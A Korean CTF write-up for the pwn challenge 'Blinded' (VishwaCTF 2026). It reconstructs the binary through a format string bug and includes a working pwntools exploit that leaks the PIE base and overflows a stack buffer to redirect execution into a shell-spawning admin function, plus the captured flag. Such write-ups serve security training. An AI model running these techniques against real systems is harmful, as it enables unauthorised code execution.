---
ctf_name: "2026-VishwaCTF"
challenge_name: "Blinded"
category: "pwn"
difficulty: "medium"
author: "vestman828"
date: "2026-04-05"
tags: [fsb]
---

# Blinded

## 문제 설명

> 2026-VishwaCTF에 Blinded 문제입니다. Pwn입니다.

## 풀이

### 분석

```text
=== Admin Console ===
1. Log a note
2. Enter secret info
3. Exit
```
완전히 블랙박스 상태였고,
몇 가지 시도를 하다가 fsb가 되는 것을 알게 되었습니다.
(옵션 1에서 fsb)

2번 옵션은 긴 입력을 넣으면 크래시가 발생합니다. 따라서 stack overflow 후보로 보였습니다.
(72바이트부터 프로세스가 크래시 발생)

fsb로 코드와 데이터 바이트를 덤프한 뒤, 이를 바탕으로 디컴파일 스타일의 로직을 복원했습니다.

(A) 숨겨진 admin 함수 (0x12a9 주변 덤프)
void admin_access(void) {
    puts("ADMIN ACCESS GRANTED!");
    system("/bin/sh");
}

(B) secret input handler (0x12d2 주변 덤프)
void enter_secret_info(void) {
    char secret[0x40];
    puts("Enter your secret info:");
    read(0, secret, 0xc8);  // BOF: 64바이트 버퍼에 200바이트 읽기
}

(C) logger 경로 (0x1306 주변 덤프)
void log_note(void) {
    char note[0x80];
    puts("Log a note:");
    read(0, note, 0x80);

    pid_t pid = fork();
    if (pid < 0) {
        puts("Note logging failed.");
        return;
    }
    if (pid == 0) {
        printf(note);   // format string bug
        exit(0);
    }

    waitpid(pid, ...);
    // 에러 처리 시 "Note logging failed." 출력
}

(D) 메인 메뉴 디스패처 (0x13ef 주변 덤프)
void menu_loop(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        puts("=== Admin Console ===");
        puts("1. Log a note");
        puts("2. Enter secret info");
        puts("3. Exit");

        fgets(choice_buf, 8, stdin);
        int choice = atoi(choice_buf);

        if (choice == 1) log_note();
        else if (choice == 2) enter_secret_info();
        else exit(0);
    }
}


이어서, %62$p로 메인 바이너리 내부 포인터(_start 근처)를 안정적으로 유출했습니다.
pie_base = leak_62 - 0x11c0;

이어서 admin_access로 return address overwrite하여 해결했습니다.

### 익스플로잇

```python
from pwn import *

HOST, PORT = "212.2.248.184", 31650
io = remote(HOST, PORT)

def leak_base():
    io.recvuntil(b"3. Exit\n")
    io.sendline(b"1")
    io.recvuntil(b"Log a note:\n")
    io.sendline(b"%62$p")
    out = io.recvuntil(b"3. Exit\n")
    leak = int(out.split(b"\n")[0], 16)
    return leak - 0x11c0

base = leak_base()
ret_align = base + 0x13ee
admin_fn = base + 0x12a9

io.sendline(b"2")
io.recvuntil(b"Enter your secret info:\n")
payload = b"A" * 72 + p64(ret_align) + p64(admin_fn)
io.sendline(payload)

io.sendline(b"cat flag.txt")
io.interactive()
```

## 플래그

```
VishwaCTF{adm1n_c0ns0le_0v3rr1d3_46946ab9}
```

## 배운 점

Weight 40아래인 Bad CTF는 거르자
